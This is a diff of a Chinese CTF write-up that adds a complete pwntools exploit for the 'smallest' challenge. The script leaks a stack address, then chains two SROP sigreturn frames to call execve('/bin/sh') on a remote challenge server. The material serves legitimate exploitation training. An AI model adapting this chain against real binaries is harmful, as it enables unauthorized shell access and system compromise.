@@ -2099,7 +2099,7 @@ ret start再读入，rsp 下移 8 位指向 `0x20`。
 ```
 ---
 
-### Phase 4 & 5：在受控栈上构造第二次 SROP
+Phase 4 & 5：在受控栈上构造第二次 SROP
 
 触发 sigreturn 后，rsp 被改为 stack_addr，并执行 `read(0, stack_addr, 0x400)`
 
@@ -2133,6 +2133,67 @@ ret start再读入，rsp 下移 8 位指向 `0x20`。
 
 
 最后再 ret start 重新读入，rsp 向下移 8 位，`sigreturn = p64(syscall_ret) + b'\x00'*7` 执行 execve。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 27847
+io = remote(host,port)
+# io = process("./smallest")
+start = 0x4000B0
+syscall_ret = 0x4000BE
+
+
+def main():
+    payload_1 = p64(start)*3
+    io.send(payload_1)
+    sleep(0.1)
+    
+    payload_2 = b'\xB3'         # 跳过 rax xor rax,并使 rax = 1
+    # 执行 mov rdi,rax 后 ,rdi = 1(stdout)
+    io.send(payload_2)
+    # 执行 syscall，变成 sys_write(1,rsp,0x400)
+    leak_data = io.recv(0x400)
+    stack_addr = u64(leak_data[8:16]) # 前八个字节是我们填入的 start
+    stack_addr = stack_addr - 0x2000        # 内存过高，防止越界，向下放一点
+    print(hex(stack_addr))
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = stack_addr
+    frame1.rdx = 0x400
+    frame1.rsp = stack_addr
+    frame1.rip = syscall_ret
+
+    payload_3 = p64(start) + b'A'*8 + bytes(frame1)
+    io.send(payload_3)
+    sleep(0.1)
+
+    sigreturn = p64(syscall_ret) + b'\x00'*7
+    io.send(sigreturn)
+    sleep(0.1)
+
+    binsh = stack_addr + 0x300
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+
+    payload_4 = p64(start) + b'B'*8 + bytes(frame2)
+    payload_4 = payload_4.ljust(0x300,b'\x00') + b'/bin/sh\x00'
+    io.send(payload_4)
+    sleep(0.1)
+    io.send(sigreturn)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
 
 #### 例题 2：ciscn_2019_s_3
 
